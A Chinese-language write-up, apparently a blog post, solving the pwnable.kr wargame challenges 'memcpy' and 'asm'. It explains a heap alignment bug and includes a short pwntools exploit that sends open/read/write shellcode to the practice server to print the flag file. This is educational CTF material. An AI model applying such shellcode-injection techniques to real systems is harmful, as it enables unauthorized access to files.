作者：萌新 合天智汇

附上链接：

萌新带你开车上p站（一）：<https://www.freebuf.com/column/229237.html>

萌新带你开车上p站（二）：<https://www.freebuf.com/column/229330.html>

萌新带你开车上p站（三）：<https://www.freebuf.com/column/229530.html>

萌新带你开车上p站(Ⅳ)：<https://www.freebuf.com/column/232683.html>

  

0x16memcpy

源码在http://pwnable.kr/bin/memcpy.c

直接编译可能会报错，根据报错提示是因为缺少相应的头文件

因为编译选项-m32：编译出来的是32位程序，既可以在32位操作系统运行，又可以在64位操作系统运行。这就需要multilib，它可以支持在64位机器上生成32位和64位的文件。

如图所示解决即可：apt-get install gcc-multilib

![v2-52f0da44d5abdff71dadfca44fd90769_720w](https://pic2.zhimg.com/80/v2-52f0da44d5abdff71dadfca44fd90769_720w.jpeg)

接下来就可以了

![v2-3be392a42d3e50eb46a55e4193f046ba_720w](https://pic1.zhimg.com/80/v2-3be392a42d3e50eb46a55e4193f046ba_720w.jpeg)

测试运行

![v2-034147a6583e0be57d9bc646f6f9215f_720w](https://pic2.zhimg.com/80/v2-034147a6583e0be57d9bc646f6f9215f_720w.jpeg)

没有拿到flag

关键点：

![v2-689df56ab08e1398841e6f3b2f7dbb5a_720w](https://pic3.zhimg.com/80/v2-689df56ab08e1398841e6f3b2f7dbb5a_720w.jpeg)

程序打印10轮在2的各次幂，要求用户依次输入10个满足该区间的数，然后根据用户的输入malloc()在堆上进行分配。然后分别通过slow_memcpy,fats_memcpy进行src到dst的拷贝操作。比较花费的时间。

![v2-2dd9ee939b04e14cef5c92151529ba49_720w](https://pic3.zhimg.com/80/v2-2dd9ee939b04e14cef5c92151529ba49_720w.jpeg)

由上图可知，slow_memcpy是单个单个字节复制，而fast_copy在复制的字节数小于64时用slow的，大于64时，通过内联汇汇编，使用sse2的指令集movdqa,movntps借助寄存器复制

![v2-ac229bb37abdb734baebba6d0f9f201a_720w](https://pic4.zhimg.com/80/v2-ac229bb37abdb734baebba6d0f9f201a_720w.jpeg)

![v2-562a587a4f07b6bcd958f6e4272103db_720w](https://pic1.zhimg.com/80/v2-562a587a4f07b6bcd958f6e4272103db_720w.jpeg)

可知，操作数应按16字节对齐

所以出错的原因就是在这儿

传给fast_memcpy的dst是malloc返回的

而我们知道，malloc在分配时会多分配4字节用于存储堆的其他信息，而且会进行8字节的自动补齐，最后返回开启的起始地址

换句话说，只要malloc每次请求大小为16字节对齐的空间就满足条件了

设传给malloc的为a，则满足(a+4)%16>9或者(a+4)%16=0即可

这里给出一组符合条件的值

8 26 38 69 136 264 520 1032 2056 4104

0x17asm

源码比较长，可以ssh asm@pwnable.kr -p2222 (pw: guest)登录后自行查看

这里给出关键点：

做了一个沙箱的环境

![v2-b0aaf917a429bec7350b53f1656619c4_720w](https://pic2.zhimg.com/80/v2-b0aaf917a429bec7350b53f1656619c4_720w.jpeg)

只给我们留下了open,read,werite,exit等方法

一段stub

![v2-05c3973d3aad707742707dfd375d787b_720w](https://pic4.zhimg.com/80/v2-05c3973d3aad707742707dfd375d787b_720w.jpeg)

转成汇编

![v2-b82a59bc058bddfdfd2c903ab6c403e9_720w](https://pic4.zhimg.com/80/v2-b82a59bc058bddfdfd2c903ab6c403e9_720w.jpeg)

可以看到作用是清空各个寄存器

![v2-b4a02b7253612cfd2b0350907101e9ff_720w](https://pic4.zhimg.com/80/v2-b4a02b7253612cfd2b0350907101e9ff_720w.jpeg)

sh由mmap分配，然后插入stub，再读我们的shellcode，设置沙箱

沙箱规则已经解释过了，可想可知，我们的shellcode该做的就是open打开flag，read读取，然后使用write将flag写到标准输出上

pwntools的shellcraft可用于生成shellcode

这三个函数在pwntools的原型

![v2-1d1ccb35e0f6cd9c463aecb65aa356b1_720w](https://pic2.zhimg.com/80/v2-1d1ccb35e0f6cd9c463aecb65aa356b1_720w.jpeg)

![v2-17690595675215b44af2267cebd1beda_720w](https://pic3.zhimg.com/80/v2-17690595675215b44af2267cebd1beda_720w.jpeg)

![v2-5912522e67242b1f19f6edb158edb9c2_720w](https://pic2.zhimg.com/80/v2-5912522e67242b1f19f6edb158edb9c2_720w.jpeg)

在调用open函数后文件描述符fd在rax中，rsp为栈指针寄存器，指向buf

fd=1代表标准输出，所以得到下面的exp

from pwn import * context.arch = "amd64" context.os = "linux" p =
remote("pwnable.kr", 9026) shellcode = "" filename =
"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
shellcode += shellcraft.open(filename) shellcode += shellcraft.read('rax',
'rsp', 100) shellcode += shellcraft.write(1, 'rsp', 100)
p.recvuntil("shellcode: ") p.send(asm(shellcode)) print p.recv()

运行后拿到flag

![v2-a09a3d752dd2dac2e90e70430c0a4856_720w](https://pic2.zhimg.com/80/v2-a09a3d752dd2dac2e90e70430c0a4856_720w.jpeg)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

